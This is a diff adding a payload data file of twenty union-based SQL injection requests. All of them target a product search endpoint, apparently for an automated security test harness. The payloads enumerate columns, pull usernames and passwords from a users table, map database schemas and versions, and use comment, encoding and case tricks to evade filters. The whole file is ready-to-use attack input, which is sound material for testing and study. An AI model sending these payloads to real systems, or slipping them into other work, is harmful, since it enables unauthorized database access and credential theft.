@@ -1,0 +1,30 @@
+# Union-based SQL Injection Payloads
+# Format: method|endpoint|payload|expected_code|attack_id|description
+
+# Union Select - Column Enumeration
+GET|/rest/products/search?q=' ORDER BY 1 --||200|sqli_union_001|Column count test 1
+GET|/rest/products/search?q=' ORDER BY 2 --||200|sqli_union_002|Column count test 2
+GET|/rest/products/search?q=' ORDER BY 3 --||200|sqli_union_003|Column count test 3
+GET|/rest/products/search?q=' ORDER BY 4 --||200|sqli_union_004|Column count test 4
+GET|/rest/products/search?q=' ORDER BY 5 --||200|sqli_union_005|Column count test 5
+
+# Union Select - Data Extraction
+GET|/rest/products/search?q=' UNION SELECT null,null,null --||200|sqli_union_006|Union with nulls
+GET|/rest/products/search?q=' UNION SELECT 1,2,3 --||200|sqli_union_007|Union with numbers
+GET|/rest/products/search?q=' UNION SELECT 'a','b','c' --||200|sqli_union_008|Union with strings
+GET|/rest/products/search?q=' UNION SELECT username,password,email FROM users --||200|sqli_union_009|Extract user credentials
+GET|/rest/products/search?q=' UNION SELECT table_name,null,null FROM information_schema.tables --||200|sqli_union_010|Extract table names
+
+# Advanced Union Attacks
+GET|/rest/products/search?q=' UNION SELECT @@version,null,null --||200|sqli_union_011|MySQL version
+GET|/rest/products/search?q=' UNION SELECT version(),current_user(),database() --||200|sqli_union_012|MySQL info gathering
+GET|/rest/products/search?q=' UNION SELECT schema_name,null,null FROM information_schema.schemata --||200|sqli_union_013|List all databases
+GET|/rest/products/search?q=' UNION SELECT column_name,data_type,table_name FROM information_schema.columns WHERE table_name='users' --||200|sqli_union_014|List columns in users table
+GET|/rest/products/search?q=' UNION SELECT CONCAT(username,':',password),null,null FROM users --||200|sqli_union_015|Concatenated credentials
+
+# Bypass Techniques
+GET|/rest/products/search?q=' UNION/**/SELECT/**/1,2,3 --||200|sqli_union_016|Comment bypass spaces
+GET|/rest/products/search?q=' UNION%20SELECT%201,2,3 --||200|sqli_union_017|URL encoded spaces
+GET|/rest/products/search?q=' UnIoN SeLeCt 1,2,3 --||200|sqli_union_018|Case variation bypass
+GET|/rest/products/search?q=' UNION ALL SELECT 1,2,3 --||200|sqli_union_019|Union all variant
+GET|/rest/products/search?q=' /*!UNION*/ /*!SELECT*/ 1,2,3 --||200|sqli_union_020|MySQL specific bypass
